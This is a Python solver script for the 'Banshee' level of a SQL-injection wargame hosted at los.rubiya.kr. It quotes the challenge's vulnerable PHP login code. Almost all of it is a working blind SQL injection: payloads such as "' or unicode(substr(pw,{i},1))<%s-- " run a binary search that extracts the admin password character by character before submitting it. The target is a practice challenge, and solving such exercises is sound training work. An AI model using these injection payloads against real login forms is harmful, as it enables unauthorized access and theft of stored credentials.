#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'login success!' in args[0]


def main():
    '''
    Banshee 39

    if(preg_match('/sqlite|member|_/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['id']) echo "<h2>login success!</h2>";

    $query = "select pw from member where id='admin'"; 
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['pw'] === $_GET['pw']) solve("banshee"); 
    '''

    url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php"
    cook = los.check_cookies(url)

    param = dict(pw="' or length(pw)>%s-- ")
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        param = dict(pw=f"' or unicode(substr(pw,{i},1))<%s-- ")
        left, num_requests = los.find_binary(url, param, check_func,
                                             32, 127, cook)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Banshee Clear!')


if __name__ == '__main__':
    main()
